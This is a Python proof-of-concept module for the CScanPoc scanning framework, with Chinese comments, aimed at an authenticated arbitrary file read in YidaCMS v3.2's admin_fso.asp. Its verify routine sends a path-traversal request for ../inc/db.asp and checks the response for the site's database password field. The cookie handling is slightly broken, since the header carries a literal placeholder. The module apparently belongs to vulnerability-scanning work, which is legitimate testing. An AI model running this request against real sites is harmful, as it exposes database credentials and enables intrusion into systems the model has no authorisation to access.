# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'YidaCMS_0002'  # 平台漏洞编号，留空
    name = 'YidaCMS v3.2 /Yidacms/admin/admin_fso.asp 任意文件读取漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-08-27'  # 漏洞公布时间
    desc = '''
        YidaCMS免费开源网站管理系统，是一款简单、实用、高效的网站建站软件。YidaCMS免费开源网站管理系统是基于微软的WINDOWS IIS平台，采用ASP语言ACCESS和MSSQL双数据库开发完成。\n整体系统采用强大的HTML引擎，模板设计和程序语言完全分开，这会让您在设计模板时更加快捷和方便。全站静态化及标准的URL路径，更加让百度等搜索引擎青睐。
        YidaCMS /Yidacms/admin/admin_fso.asp在读取文件时，没有任何过滤处理，直接拼接文件路径，然后直接读取。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YidaCMS(易达CMS)'  # 漏洞应用名称
    product_version = 'v3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e6bfa56-2c3f-4d62-83a3-b7991651af98'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # this poc need to login, so special cookie for target must be included in http headers.
            cookie = 'Unknown'  # 需要填上对应的cookie
            headers = {
                'cookie': 'cookie'
            }
            verify_url = self.target + '/admin/admin_fso.asp?action=Edit'
            post_content = r'''FileId=../inc/db.asp&ThisDir='''
            req = urllib.request.Request(
                verify_url, post_content, headers=headers)
            content = urllib.request.urlopen(req).read()

            if 'webpath' in content and 'YidaCms_Sqlpass' in content:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                #args['poc_ret']['post_content'] = post_content
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
